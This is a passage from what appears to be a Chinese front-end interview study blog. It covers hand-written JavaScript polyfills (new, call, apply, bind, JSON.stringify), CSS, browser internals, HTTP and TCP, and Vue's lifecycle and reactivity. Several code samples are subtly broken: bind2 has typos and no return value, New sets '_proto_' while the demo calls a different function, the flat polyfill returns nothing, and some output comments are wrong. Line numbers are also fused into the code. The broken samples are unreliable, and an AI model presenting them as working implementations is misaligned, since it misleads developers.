}, delay); } };};function handle() { console.log(Math.random());}window.addEventListener(\"scroll\", throttle(handle, 1000)); 模拟 new new产生的实例可以访问Constructor里的属性，也可以访问到Constructor.prototype中的属性，前者可以通过apply来实现，后者可以通过将实例的proto属性指向构造函数的prototype来实现 我们还需要判断返回的值是不是一个对象，如果是一个对象，我们就返回这个对象，如果没有，我们该返回什么就返回什么 1234567891011function New() { var obj = new Object(); //取出第一个参数，就是我们要传入的构造函数；此外因为shift会修改原数组，所以arguments会被去除第一个参数 Constructor = [].shift.call(arguments); //将obj的原型指向构造函数，这样obj就可以访问到构造函数原型中的属性 obj._proto_ = Constructor.prototype; //使用apply改变构造函数this的指向到新建的对象，这样obj就可以访问到构造函数中的属性 var ret = Constructor.apply(obj, arguments); //要返回obj return typeof ret === \"object\" ? ret : obj;} 123456789101112131415function Otaku(name, age) { this.name = name; this.age = age; this.habit = \"Games\";}Otaku.prototype.sayYourName = function() { console.log(\"I am\" + this.name);};var person = objectFactory(Otaku, \"Kevin\", \"18\");console.log(person.name); //Kevinconsole.log(person.habit); //Gamesconsole.log(person.strength); //60 模拟 call call()方法在使用一个指定的 this 值和若干个指定的参数值的前提下调用某个函数或方法 模拟的步骤是：将函数设为对象的属性—>执行该函数—>删除该函数 this参数可以传null，当为null的时候，视为指向window 函数是可以有返回值的 简单版1234567var foo = { value: 1, bar: function() { console.log(this.value); }};foo.bar(); // 1 完善版123456789101112131415161718Function.prototype.call2 = function(context) { var context = context || window; context.fn = this; let args = [...arguments].slice(1); let result = context.fn(...args); delete context.fn; return result;};let foo = { value: 1};function bar(name, age) { console.log(name); console.log(age); console.log(this.value);}//表示bar函数的执行环境是foo，即bar函数里面的this代表foo,this.value相当于foo.value,然后给bar函数传递两个参数bar.call2(foo, \"black\", \"18\"); // black 18 1 模拟 apply apply()的实现和call()类似，只是参数形式不同 123456789101112Function.prototype.apply2 = function(context = window) { context.fn = this; let result; // 判断是否有第二个参数 if (arguments[1]) { result = context.fn(...arguments[1]); } else { result = context.fn(); } delete context.fn; return result;}; 模拟 bind12345678910111213Function.prototype.bind2 = function(context) { var self = thisl; var args = Array.prototype.slice.call(arguments, 1); var fNOP = function() {}; var fBound = function() { var bindArgs = Array.prototype.slice.call(arguments); return self.apply( this instanceof fNOP ? this : context, args.concat(bindAt) ); };}; 模拟 instanceof123456789function instanceOf(left, right) { let proto = left.__proto__; let prototype = right.prototype; while (true) { if (proto === null) return false; if (proto === prototype) return true; proto = proto.__proto__; }} 模拟 JSON.stringify JSON.stringify(value[, replacer [, space]]) Boolean | Number| String 类型会自动转换成对应的原始值。 undefined、任意函数以及symbol，会被忽略（出现在非数组对象的属性值中时），或者被转换成 null（出现在数组中时）。 不可枚举的属性会被忽略 如果一个对象的属性值通过某种间接的方式指回该对象本身，即循环引用，属性也会被忽略。 1234567891011121314151617181920212223242526function jsonStringify(obj) { let type = typeof obj; if (type !== \"object\") { if (/string|undefined|function/.test(type)) { obj = '\"' + obj + '\"'; } return String(obj); } else { let json = []; let arr = Array.isArray(obj); for (let k in obj) { let v = obj[k]; let type = typeof v; if (/string|undefined|function/.test(type)) { v = '\"' + v + '\"'; } else if (type === \"object\") { v = jsonStringify(v); } json.push((arr ? \"\" : '\"' + k + '\":') + String(v)); } return (arr ? \"[\" : \"{\") + String(json) + (arr ? \"]\" : \"}\"); }}jsonStringify({ x: 5 }); // \"{\"x\":5}\"jsonStringify([1, \"false\", false]); // \"[1,\"false\",false]\"jsonStringify({ b: undefined }); // \"{\"b\":\"undefined\"}\" 模拟 JSON.parse JSON.parse(text[, reviver]) 用来解析 JSON 字符串，构造由字符串描述的 JavaScript 值或对象。提供可选的 reviver 函数用以在返回之前对所得到的对象执行变换(操作)。 利用 eval123456789function jsonParse(opt) { return eval(\"(\" + opt + \")\");}jsonParse(jsonStringify({ x: 5 }));// Object { x: 5}jsonParse(jsonStringify([1, \"false\", false]));// [1, \"false\", falsr]jsonParse(jsonStringify({ b: undefined }));// Object { b: \"undefined\"} 避免在不必要的情况下使用 eval，eval() 是一个危险的函数， 他执行的代码拥有着执行者的权利。如果你用 eval()运行的字符串代码被恶意方（不怀好意的人）操控修改，您最终可能会在您的网页/扩展程序的权限下，在用户计算机上运行恶意代码 利用 new Function()Function与eval有相同的字符串参数特性,eval 与 Function 都有着动态编译 js 代码的作用，但是在实际的编程中并不推荐使用。 var func = new Function(arg1, arg2, …, functionBody) 12var jsonStr = '{ \"age\": 20, \"name\": \"jack\" }';var json = new Function(\"return \" + jsonStr)();","link":"/posts/cdbb0408/"},{"title":"前端学习知识点","text":"CSS1. 盒模型页面渲染时，dom 元素所采用的 布局模型。可通过box-sizing进行设置。根据计算宽高的区域可分为： content-box (W3C 标准盒模型) border-box (IE 盒模型) padding-box margin-box 2. BFC块级格式化上下文，是一个独立的渲染区域，让处于 BFC 内部的元素与外部的元素相互隔离，使内外元素的定位不会相互影响。 IE下为 Layout，可通过 zoom:1 触发 触发条件: 根元素 position: absolute/fixed display: inline-block / table float 元素 ovevflow !== visible 规则: 属于同一个 BFC 的两个相邻 Box 垂直排列 属于同一个 BFC 的两个相邻 Box 的 margin 会发生重叠 BFC 中子元素的 margin box 的左边， 与包含块 (BFC) border box的左边相接触 (子元素 absolute 除外) BFC 的区域不会与 float 的元素区域重叠 计算 BFC 的高度时，浮动子元素也参与计算 文字层不会被浮动层覆盖，环绕于周围 应用: 阻止margin重叠 可以包含浮动元素 —— 清除内部浮动(清除浮动的原理是两个div都位于同一个 BFC 区域之中) 自适应两栏布局 可以阻止元素被浮动元素覆盖 3.层叠上下文元素提升为一个比较特殊的图层，在三维空间中 (z轴) 高出普通元素一等。 触发条件 根层叠上下文(html) position css3属性 flex transform opacity filter will-change -webkit-overflow-scrolling 层叠等级：层叠上下文在z轴上的排序 在同一层叠上下文中，层叠等级才有意义 z-index的优先级最高 4. 居中布局 水平居中 行内元素: text-align: center 块级元素: margin: 0 auto absolute + transform flex + justify-content: center 垂直居中 line-height: height absolute + transform flex + align-items: center table 水平垂直居中 absolute + transform flex + justify-content + align-items 5. 选择器优先级 !important > 行内样式 > #id > .class > tag > * > 继承 > 默认 选择器 从右往左 解析 6.去除浮动影响，防止父级高度塌陷 通过增加尾元素清除浮动 :after / : clear: both 创建父级 BFC 父级设置高度 7.link 与 @import 的区别 link功能较多，可以定义 RSS，定义 Rel 等作用，而@import只能用于加载 css 当解析到link时，页面会同步加载所引的 css，而@import所引用的 css 会等到页面加载完才被加载 @import需要 IE5 以上才能使用 link可以使用 js 动态引入，@import不行 8. CSS预处理器(Sass/Less/Postcss)CSS预处理器的原理: 是将类 CSS 语言通过 Webpack 编译 转成浏览器可读的真正 CSS。在这层编译之上，便可以赋予 CSS 更多更强大的功能，常用功能: 嵌套 变量 循环语句 条件语句 自动前缀 单位转换 mixin复用 面试中一般不会重点考察该点，一般介绍下自己在实战项目中的经验即可~ 9.CSS动画 transition: 过渡动画 transition-property: 属性 transition-duration: 间隔 transition-timing-function: 曲线 transition-delay: 延迟 常用钩子: transitionend animation / keyframes animation-name: 动画名称，对应@keyframes animation-duration: 间隔 animation-timing-function: 曲线 animation-delay: 延迟 animation-iteration-count: 次数 infinite: 循环动画 animation-direction: 方向 alternate: 反向播放 animation-fill-mode: 静止模式 forwards: 停止时，保留最后一帧 backwards: 停止时，回到第一帧 both: 同时运用 forwards / backwards 常用钩子: animationend 动画属性: 尽量使用动画属性进行动画，能拥有较好的性能表现 translate scale rotate skew opacity color 经验通常，CSS 并不是重点的考察领域，但这其实是由于现在国内业界对 CSS 的专注不够导致的，真正精通并专注于 CSS 的团队和人才并不多。因此如果能在 CSS 领域有自己的见解和经验，反而会为相当的加分和脱颖而出。 JavaScript1. 原型 / 构造函数 / 实例 原型(prototype): 一个简单的对象，用于实现对象的 属性继承。可以简单的理解成对象的爹。在 Firefox 和 Chrome 中，每个JavaScript对象中都包含一个__proto__ (非标准)的属性指向它爹(该对象的原型)，可obj.__proto__进行访问。 构造函数: 可以通过new来 新建一个对象 的函数。 实例: 通过构造函数和new创建出来的对象，便是实例。 实例通过__proto__指向原型，通过constructor指向构造函数。 说了一大堆，大家可能有点懵逼，这里来举个栗子，以Object为例，我们常用的Object便是一个构造函数，因此我们可以通过它构建实例。 12// 实例const instance = new Object() 则此时， 实例为instance, **构造函数为Object**，我们知道，构造函数拥有一个prototype的属性指向原型，因此原型为: 12// 原型const prototype = Object.prototype 这里我们可以来看出三者的关系: 1234567实例.__proto__ === 原型原型.constructor === 构造函数构造函数.prototype === 原型实例.constructor === 构造函数 2.原型链：原型链是由原型对象组成，每个对象都有 __proto__ 属性，指向了创建该对象的构造函数的原型，__proto__ 将对象连接起来组成了原型链。是一个用来实现继承和共享属性的有限的对象链。 属性查找机制: 当查找对象的属性时，如果实例对象自身不存在该属性，则沿着原型链往上一级查找，找到时则输出，不存在时，则继续沿着原型链往上一级查找，直至最顶级的原型对象Object.prototype，如还是没找到，则输出undefined； 属性修改机制: 只会修改实例对象本身的属性，如果不存在，则进行添加该属性，如果需要修改原型的属性时，则可以用: b.prototype.x = 2；但是这样会造成所有继承于该对象的实例的属性发生改变。 3. 执行上下文(EC)执行上下文可以简单理解为一个对象: 它包含三个部分: 变量对象(VO) 作用域链(词法作用域) this指向 它的类型: 全局执行上下文 函数执行上下文 eval执行上下文 代码执行过程: 创建 全局上下文 (global EC) 全局执行上下文 (caller) 逐行 自上而下 执行。遇到函数时，函数执行上下文 (callee) 被push到执行栈顶层 函数执行上下文被激活，成为 active EC, 开始执行函数中的代码，caller 被挂起 函数执行完后，callee 被pop移除出执行栈，控制权交还全局上下文 (caller)，继续执行 2.变量对象变量对象，是执行上下文中的一部分，可以抽象为一种 数据作用域，其实也可以理解为就是一个简单的对象，它存储着该执行上下文中的所有 **变量和函数声明(不包含函数表达式)**。 活动对象 (AO): 当变量对象所处的上下文为 active EC 时，称为活动对象。 3. 作用域执行上下文中还包含作用域链。理解作用域之前，先介绍下作用域。作用域其实可理解为该上下文中声明的 变量和声明的作用范围。可分为 块级作用域 和 函数作用域 特性: 声明提前: 一个声明在函数体内都是可见的, 函数优先于变量 非匿名自执行函数，函数变量为 只读 状态，无法修改 1234567const foo = 1(function foo() { foo = 10 // 由于foo在函数中只为可读，因此赋值无效 console.log(foo)}()) // 结果打印： ƒ foo() { foo = 10 ; console.log(foo) } 4.作用域链我们知道，我们可以在执行上下文中访问到父级甚至全局的变量，这便是作用域链的功劳。作用域链可以理解为一组对象列表，包含 父级和自身的变量对象，因此我们便能通过作用域链访问到父级里声明的变量或者函数。 由两部分组成: [[scope]]属性: 指向父级变量对象和作用域链，也就是包含了父级的[[scope]]和AO AO: 自身活动对象 如此 [[scopr]]包含[[scope]]，便自上而下形成一条 链式作用域。 5. 闭包闭包属于一种特殊的作用域，称为 静态作用域。它的定义可以理解为: 父函数被销毁 的情况下，返回出的子函数的[[scope]]中仍然保留着父级的单变量对象和作用域链，因此可以继续访问到父级的变量对象，这样的函数称为闭包。 闭包会产生一个很经典的问题: 多个子函数的[[scope]]都是同时指向父级，是完全共享的。因此当父级的变量对象被修改时，所有子函数都受到影响。 解决: 变量可以通过 函数参数的形式 传入，避免使用默认的[[scope]]向上查找 使用setTimeout包裹，通过第三个参数传入 使用 块级作用域，让变量成为自己上下文的属性，避免共享 6. script 引入方式： html 静态引入 js 动态插入 : 异步加载，元素解析完成后执行 : 异步加载，但执行时会阻塞元素渲染 7. 对象的拷贝 浅拷贝: 以赋值的形式拷贝引用对象，仍指向同一个地址，修改时原对象也会受到影响 Object.assign 展开运算符(…) 深拷贝: 完全拷贝一个新对象，修改时原对象不再受到任何影响 JSON.parse(JSON.stringify(obj)): 性能最快 具有循环引用的对象时，报错 当值为函数、undefined、或symbol时，无法拷贝 递归进行逐一赋值 8. new运算符的执行过程 新生成一个对象 链接到原型: obj.__proto__ = Con.prototype 绑定this: apply 返回新对象(如果构造函数有自己 retrun 时，则返回该值) 9. instanceof原理能在实例的 原型对象链 中找到该构造函数的prototype属性所指向的 原型对象，就返回true。即: 1234// __proto__: 代表原型对象链instance.[__proto__...] === instance.constructor.prototype// return true 10. 代码的复用当你发现任何代码开始写第二遍时，就要开始考虑如何复用。一般有以下的方式: 函数封装 继承 复制extend 混入mixin 借用apply/call 11. 继承在 JS 中，继承通常指的便是 原型链继承，也就是通过指定原型，并可以通过原型链继承原型上的属性或者方法。 最优化: 圣杯模式 123456789var inherit = (function(c,p){ var F = function(){}; return function(c,p){ F.prototype = p.prototype; c.prototype = new F(); c.uber = p.prototype; c.prototype.constructor = c; }})(); 使用 ES6 的语法糖 class / extends 12. 类型转换大家都知道 JS 中在使用运算符号或者对比符时，会自带隐式转换，规则如下: -、*、/、% ：一律转换成数值后计算 +： 数字 + 字符串 = 字符串， 运算顺序是从左到右 数字 + 对象， 优先调用对象的valueOf -> toString 数字 + boolean/null = 数字 数字 + undefined == NaN [1].toString() === '1' {}.toString() === '[object object]' NaN !== NaN 、+undefined === NaN 13. 类型判断判断 Target 的类型，单单用 typeof 并无法完全满足，这其实并不是 bug，本质原因是 JS 的万物皆对象的理论。因此要真正完美判断时，我们需要区分对待: 基本类型(null): 使用 String(null) 基本类型(string / number / boolean / undefined) + function: 直接使用 typeof即可 其余引用类型(Array / Date / RegExp Error): 调用toString后根据[object XXX]进行判断 很稳的判断封装: 1234567let class2type = {}'Array Date RegExp Object Error'.split(' ').forEach(e => class2type[ '[object ' + e + ']' ] = e.toLowerCase()) function type(obj) { if (obj == null) return String(obj) return typeof obj === 'object' ? class2type[ Object.prototype.toString.call(obj) ] || 'object' : typeof obj} 14. 模块化模块化开发在现代开发中已是必不可少的一部分，它大大提高了项目的可维护、可拓展和可协作性。通常，我们 在浏览器中使用 ES6 的模块化支持，在 Node 中使用 commonjs 的模块化支持。 分类: es6: import / exports commonjs: require / module.exports / exports amd: require / defined require与import的区别 require支持 动态导入，import不支持，正在提案 (babel 下可支持) require是 同步 导入，import属于 异步 导入 require是 值拷贝，导出值变化不会影响导入值；import指向 内存地址，导入值会随导出值而变化 15. 防抖与节流防抖与节流函数是一种最常用的 高频触发优化方式，能对性能有较大的帮助。 防抖 (debounce): 将多次高频操作优化为只在最后一次执行，通常使用的场景是：用户输入，只需再输入完成后做一次输入校验即可。 1234567891011121314151617function debounce(fn, wait, immediate) { let timer = null return function() { let args = arguments let context = this if (immediate && !timer) { fn.apply(context, args) } if (timer) clearTimeout(timer) timer = setTimeout(() => { fn.apply(context, args) }, wait) }} 节流(throttle): 每隔一段时间后执行一次，也就是降低频率，将高频操作优化成低频操作，通常使用场景: 滚动条事件 或者 resize 事件，通常每隔 100~500 ms执行一次即可。 123456789101112131415161718192021function throttle(fn, wait, immediate) { let timer = null let callNow = true return function() { let context = this, args = arguments if (callNow) { fn.apply(context, args) callNow = false } if (!timer) { timer = setTimeout(() => { fn.apply(context, args) timer = null }, wait) } }} 16. 函数执行改变this由于 JS 的设计原理: 在函数中，可以引用运行环境中的变量。因此就需要一个机制来让我们可以在函数体内部获取当前的运行环境，这便是this。 因此要明白 this 指向，其实就是要搞清楚 函数的运行环境，说人话就是，谁调用了函数。例如: obj.fn()，便是 obj 调用了函数，既函数中的 this === obj fn()，这里可以看成 window.fn()，因此 this === window 但这种机制并不完全能满足我们的业务需求，因此提供了三种方式可以手动修改 this 的指向: call: fn.call(target, 1, 2) apply: fn.apply(target, [1, 2]) bind: fn.bind(target)(1,2) 17. ES6/ES7由于 Babel 的强大和普及，现在 ES6/ES7 基本上已经是现代化开发的必备了。通过新的语法糖，能让代码整体更为简洁和易读。 声明 let / const: 块级作用域、不存在变量提升、暂时性死区、不允许重复声明 const: 声明常量，无法修改 解构赋值 class / extend: 类声明与继承 Set / Map: 新的数据结构 异步解决方案: Promise的使用与实现 generator: yield: 暂停代码 next(): 继续执行代码123456789101112131415function* helloWorld() {yield 'hello';yield 'world';return 'ending';}const generator = helloWorld();generator.next() // { value: 'hello', done: false }generator.next() // { value: 'world', done: false }generator.next() // { value: 'ending', done: true }generator.next() // { value: undefined, done: true } await / async: 是generator的语法糖， babel中是基于promise实现。 12345678910111213141516 async function getUserByAsync(){ let user = await fetchUser(); return user; } const user = await getUserByAsync() console.log(user) ``` ### 18. AST**抽象语法树 (Abstract Syntax Tree)**，是将代码逐字母解析成 **树状对象** 的形式。这是语言之间的转换、代码语法检查，代码风格检查，代码格式化，代码高亮，代码错误提示，代码自动补全等等的基础。例如:```jsfunction square(n){ return n * n} 通过解析转化成的AST如下图: 19. babel编译原理 babylon 将 ES6/ES7 代码解析成 AST babel-traverse 对 AST 进行遍历转译，得到新的 AST 新 AST 通过 babel-generator 转换成 ES5 20. 函数柯里化在一个函数中，首先填充几个参数，然后再返回一个新的函数的技术，称为函数的柯里化。通常可用于在不侵入函数的前提下，为函数 预置通用参数，供多次重复调用。 12345678910const add = function add(x) { return function (y) { return x + y }}const add1 = add(1)add1(2) === 3add1(20) === 21 21. 数组(array) map: 遍历数组，返回回调返回值组成的新数组 forEach: 无法break，可以用try/catch中throw new Error来停止 filter: 过滤 some: 有一项返回true，则整体为true every: 有一项返回false，则整体为false join: 通过指定连接符生成字符串 push / pop: 末尾推入和弹出，改变原数组， 返回推入/弹出项 unshift / shift: 头部推入和弹出，改变原数组，返回操作项 sort(fn) / reverse: 排序与反转，改变原数组 concat: 连接数组，不影响原数组， 浅拷贝 slice(start, end): 返回截断后的新数组，不改变原数组 splice(start, number, value...): 返回删除元素组成的数组，value 为插入项，改变原数组 indexOf / lastIndexOf(value, fromIndex): 查找数组项，返回对应的下标 reduce / reduceRight(fn(prev, cur)， defaultPrev): 两两执行，prev 为上次化简函数的return值，cur 为当前值(从第二项开始) 数组乱序： 1234var arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];arr.sort(function () { return Math.random() - 0.5;}); 数组拆解: flat: [1,[2,3]] –> [1, 2, 3] 123arr.prototype.flat = function() { this.toString().split(',').map(item => +item )} 浏览器1. 跨标签页通讯不同标签页间的通讯，本质原理就是去运用一些可以 共享的中间介质，因此比较常用的有以下方法: 通过父页面window.open()和子页面postMessage 异步下，通过 window.open('about: blank') 和 tab.location.href = '*' 设置同域下共享的localStorage与监听window.onstorage 重复写入相同的值无法触发 会受到浏览器隐身模式等的限制 设置共享cookie与不断轮询脏检查(setInterval) 借助服务端或者中间层实现 2. 浏览器架构 用户界面 主进程 内核 渲染引擎 JS 引擎 执行栈 事件触发线程 消息队列 微任务 宏任务 网络异步线程 定时器线程 3. 浏览器下事件循环(Event Loop)事件循环是指: 执行一个宏任务，然后执行清空微任务列表，循环再执行宏任务，再清微任务列表 微任务 microtask(jobs): promise / ajax / Object.observe(该方法已废弃) 宏任务 macrotask(task): setTimout / script / IO / UI Rendering 4. 从输入 url 到展示的过程 DNS 解析 TCP 三次握手 发送请求，分析 url，设置请求报文(头，主体) 服务器返回请求的文件 (html) 浏览器渲染 HTML parser –> DOM Tree 标记化算法，进行元素状态的标记 dom 树构建 CSS parser –> Style Tree 解析 css 代码，生成样式树 attachment –> Render Tree 结合 dom树 与 style树，生成渲染树 layout: 布局 GPU painting: 像素绘制页面 5. 重绘与回流当元素的样式发生变化时，浏览器需要触发更新，重新绘制元素。这个过程中，有两种类型的操作，即重绘与回流。 重绘(repaint): 当元素样式的改变不影响布局时，浏览器将使用重绘对元素进行更新，此时由于只需要UI层面的重新像素绘制，因此 损耗较少 回流(reflow): 当元素的尺寸、结构或触发某些属性时，浏览器会重新渲染页面，称为回流。此时，浏览器需要重新经过计算，计算后还需要重新页面布局，因此是较重的操作。会触发回流的操作: 页面初次渲染 浏览器窗口大小改变 元素尺寸、位置、内容发生改变 元素字体大小变化 添加或者删除可见的 dom 元素 激活 CSS 伪类（例如：:hover） 查询某些属性或调用某些方法 clientWidth、clientHeight、clientTop、clientLeft offsetWidth、offsetHeight、offsetTop、offsetLeft scrollWidth、scrollHeight、scrollTop、scrollLeft getComputedStyle() getBoundingClientRect() scrollTo() 回流必定触发重绘，重绘不一定触发回流。重绘的开销较小，回流的代价较高。 最佳实践: css 避免使用table布局 将动画效果应用到position属性为absolute或fixed的元素上 javascript 避免频繁操作样式，可汇总后统一 一次修改 尽量使用class进行样式修改 减少dom的增删次数，可使用 字符串 或者 documentFragment 一次性插入 极限优化时，修改样式可将其display: none后修改 避免多次触发上面提到的那些会触发回流的方法，可以的话尽量用 变量存住 6. 存储我们经常需要对业务中的一些数据进行存储，通常可以分为 短暂性存储 和 持久性储存。 短暂性的时候，我们只需要将数据存在内存中，只在运行时可用 持久性存储，可以分为 浏览器端 与 服务器端 浏览器: cookie: 通常用于存储用户身份，登录状态等 http 中自动携带， 体积上限为 4K， 可自行设置过期时间 localStorage / sessionStorage: 长久储存/窗口关闭删除， 体积限制为 4~5M indexDB 服务器: 分布式缓存 redis 数据库 7. Web Worker现代浏览器为JavaScript创造的 多线程环境。可以新建并将部分任务分配到worker线程并行运行，两个线程可 独立运行，互不干扰，可通过自带的 消息机制 相互通信。 基本用法: 12345678910// 创建 workerconst worker = new Worker('work.js');// 向主进程推送消息worker.postMessage('Hello World');// 监听主进程来的消息worker.onmessage = function (event) { console.log('Received message ' + event.data);} 限制: 同源限制 无法使用 document / window / alert / confirm 无法加载本地资源 8. V8垃圾回收机制垃圾回收: 将内存中不再使用的数据进行清理，释放出内存空间。V8 将内存分成 新生代空间 和 老生代空间。 新生代空间: 用于存活较短的对象 又分成两个空间: from 空间 与 to 空间 Scavenge GC算法: 当 from 空间被占满时，启动 GC 算法 存活的对象从 from space 转移到 to space 清空 from space from space 与 to space 互换 完成一次新生代GC 老生代空间: 用于存活时间较长的对象 从 新生代空间 转移到 老生代空间 的条件 经历过一次以上 Scavenge GC 的对象 当 to space 体积超过25% 标记清除算法: 标记存活的对象，未被标记的则被释放 增量标记: 小模块标记，在代码执行间隙执，GC 会影响性能 并发标记(最新技术): 不阻塞 js 执行 压缩算法: 将内存中清除后导致的碎片化对象往内存堆的一端移动，解决 内存的碎片化 9. 内存泄露 意外的全局变量: 无法被回收 定时器: 未被正确关闭，导致所引用的外部变量无法被释放 事件监听: 没有正确销毁 (低版本浏览器可能出现) 闭包: 会导致父级中的变量无法被释放 dom 引用: dom 元素被删除时，内存中的引用未被正确清空 可用 chrome 中的 timeline 进行内存标记，可视化查看内存的变化情况，找出异常点。 服务端与网络1. http/https 协议 1.0 协议缺陷: 无法复用链接，完成即断开，重新慢启动和 TCP 3次握手 head of line blocking: 线头阻塞，导致请求之间互相影响 1.1 改进: 长连接(默认 keep-alive)，复用 host 字段指定对应的虚拟站点 新增功能: 断点续传 身份认证 状态管理 cache 缓存 Cache-Control Expires Last-Modified Etag 2.0: 多路复用 二进制分帧层: 应用层和传输层之间 首部压缩 服务端推送 https: 较为安全的网络传输协议 证书(公钥) SSL 加密 端口 443 TCP: 三次握手 四次挥手 滑动窗口: 流量控制 拥塞处理 慢开始 拥塞避免 快速重传 快速恢复 缓存策略: 可分为 强缓存 和 协商缓存 Cache-Control/Expires: 浏览器判断缓存是否过期，未过期时，直接使用强缓存，Cache-Control的 max-age 优先级高于 Expires 当缓存已经过期时，使用协商缓存 唯一标识方案: Etag(response 携带) & If-None-Match(request携带，上一次返回的 Etag): 服务器判断资源是否被修改， 最后一次修改时间: Last-Modified(response) & If-Modified-Since (request，上一次返回的Last-Modified) 如果一致，则直接返回 304 通知浏览器使用缓存 如不一致，则服务端返回新的资源 Last-Modified 缺点： 周期性修改，但内容未变时，会导致缓存失效 最小粒度只到 s， s 以内的改动无法检测到 Etag 的优先级高于 Last-Modified 2. 常见状态码 1xx: 接受，继续处理 200: 成功，并返回数据 201: 已创建 202: 已接受 203: 成为，但未授权 204: 成功，无内容 205: 成功，重置内容 206: 成功，部分内容 301: 永久移动，重定向 302: 临时移动，可使用原有URI 304: 资源未修改，可使用缓存 305: 需代理访问 400: 请求语法错误 401: 要求身份认证 403: 拒绝请求 404: 资源不存在 500: 服务器错误 3. get / post get: 缓存、请求长度受限、会被历史保存记录 无副作用(不修改资源)，幂等(请求次数与资源无关)的场景 post: 安全、大数据、更多编码类型 两者详细对比如下图: 4. WebsocketWebsocket 是一个 持久化的协议， 基于 http ， 服务端可以 主动 push 兼容： FLASH Socket 长轮询： 定时发送 ajax long poll： 发送 –> 有消息时再 response new WebSocket(url) ws.onerror = fn ws.onclose = fn ws.onopen = fn ws.onmessage = fn ws.send() 5. TCP三次握手建立连接前，客户端和服务端需要通过握手来确认对方: 客户端发送 syn(同步序列编号) 请求，进入 syn_send 状态，等待确认 服务端接收并确认 syn 包后发送 syn+ack 包，进入 syn_recv 状态 客户端接收 syn+ack 包后，发送 ack 包，双方进入 established 状态 6. TCP四次挥手 客户端 – FIN –> 服务端， FIN—WAIT 服务端 – ACK –> 客户端， CLOSE-WAIT 服务端 – ACK,FIN –> 客户端， LAST-ACK 客户端 – ACK –> 服务端，CLOSED 7. Node 的 Event Loop: 6个阶段 timer 阶段: 执行到期的setTimeout / setInterval队列回调 I/O 阶段: 执行上轮循环残流的callback idle, prepare poll: 等待回调 执行回调 执行定时器 如有到期的setTimeout / setInterval， 则返回 timer 阶段 如有setImmediate，则前往 check 阶段 check 执行setImmediate close callbacks 跨域 JSONP: 利用标签不受跨域限制的特点，缺点是只能支持 get 请求 12345678910function jsonp(url, jsonpCallback, success) { const script = document.createElement('script') script.src = url script.async = true script.type = 'text/javascript' window[jsonpCallback] = function(data) { success && success(data) } document.body.appendChild(script)} 设置 CORS: Access-Control-Allow-Origin：* postMessage 安全 XSS攻击: 注入恶意代码 cookie 设置 httpOnly 转义页面上的输入内容和输出内容 CSRF: 跨站请求伪造，防护: get 不修改数据 不被第三方网站访问到用户的 cookie 设置白名单，不被第三方网站请求 请求校验 框架：Vue1. nextTick在下次dom更新循环结束之后执行延迟回调，可用于获取更新后的dom状态 新版本中默认是mincrotasks, v-on中会使用macrotasks macrotasks任务的实现: setImmediate / MessageChannel / setTimeout 2. 生命周期 _init_ initLifecycle/Event，往vm上挂载各种属性 callHook: beforeCreated: 实例刚创建 initInjection/initState: 初始化注入和 data 响应性 created: 创建完成，属性已经绑定， 但还未生成真实dom 进行元素的挂载： $el / vm.$mount() 是否有template: 解析成render function *.vue文件: vue-loader会将编译成render function beforeMount: 模板编译/挂载之前 执行render function，生成真实的dom，并替换到dom tree中 mounted: 组件已挂载 update: 执行diff算法，比对改变是否需要触发UI更新 flushScheduleQueue watcher.before: 触发beforeUpdate钩子 - watcher.run(): 执行watcher中的 notify，通知所有依赖项更新UI 触发updated钩子: 组件已更新 actived / deactivated(keep-alive): 不销毁，缓存，组件激活与失活 destroy: beforeDestroy: 销毁开始 销毁自身且递归销毁子组件以及事件监听 remove(): 删除节点 watcher.teardown(): 清空依赖 vm.$off(): 解绑监听 destroyed: 完成后触发钩子 上面是vue的声明周期的简单梳理，接下来我们直接以代码的形式来完成vue的初始化 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879new Vue({})// 初始化Vue实例function _init() { // 挂载属性 initLifeCycle(vm) // 初始化事件系统，钩子函数等 initEvent(vm) // 编译slot、vnode initRender(vm) // 触发钩子 callHook(vm, 'beforeCreate') // 添加inject功能 initInjection(vm) // 完成数据响应性 props/data/watch/computed/methods initState(vm) // 添加 provide 功能 initProvide(vm) // 触发钩子 callHook(vm, 'created') // 挂载节点 if (vm.$options.el) { vm.$mount(vm.$options.el) }}// 挂载节点实现function mountComponent(vm) { // 获取 render function if (!this.options.render) { // template to render // Vue.compile = compileToFunctions let { render } = compileToFunctions() this.options.render = render } // 触发钩子 callHook('beforeMounte') // 初始化观察者 // render 渲染 vdom， vdom = vm.render() // update: 根据 diff 出的 patchs 挂载成真实的 dom vm._update(vdom) // 触发钩子 callHook(vm, 'mounted')}// 更新节点实现funtion queueWatcher(watcher) { nextTick(flushScheduleQueue)}// 清空队列function flushScheduleQueue() { // 遍历队列中所有修改 for(){ // beforeUpdate watcher.before() // 依赖局部更新节点 watcher.update() callHook('updated') }}// 销毁实例实现Vue.prototype.$destory = function() { // 触发钩子 callHook(vm, 'beforeDestory') // 自身及子节点 remove() // 删除依赖 watcher.teardown() // 删除监听 vm.$off() // 触发钩子 callHook(vm, 'destoryed')} 3. 数据响应(数据劫持)看完生命周期后，里面的watcher等内容其实是数据响应中的一部分。数据响应的实现由两部分构成: 观察者( watcher ) 和 依赖收集器( Dep )**，其核心是 defineProperty这个方法，它可以 **重写属性的 get 与 set 方法，从而完成监听数据的改变。 Observe (观察者)观察 props 与 state 遍历 props 与 state，对每个属性创建独立的监听器( watcher ) 使用 defineProperty 重写每个属性的 get/set(defineReactive） get: 收集依赖 Dep.depend() watcher.addDep() set: 派发更新 Dep.notify() watcher.update() queenWatcher() nextTick flushScheduleQueue watcher.run() updateComponent() 大家可以先看下面的数据相应的代码实现后，理解后就比较容易看懂上面的简单脉络了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384let data = {a: 1}// 数据响应性observe(data)// 初始化观察者new Watcher(data, 'name', updateComponent)data.a = 2// 简单表示用于数据更新后的操作function updateComponent() { vm._update() // patchs}// 监视对象function observe(obj) { // 遍历对象，使用 get/set 重新定义对象的每个属性值 Object.keys(obj).map(key => { defineReactive(obj, key, obj[key]) })}function defineReactive(obj, k, v) { // 递归子属性 if (type(v) == 'object') observe(v) // 新建依赖收集器 let dep = new Dep() // 定义get/set Object.defineProperty(obj, k, { enumerable: true, configurable: true, get: function reactiveGetter() { // 当有获取该属性时，证明依赖于该对象，因此被添加进收集器中 if (Dep.target) { dep.addSub(Dep.target) } return v }, // 重新设置值时，触发收集器的通知机制 set: function reactiveSetter(nV) { v = nV dep.nofify() }, 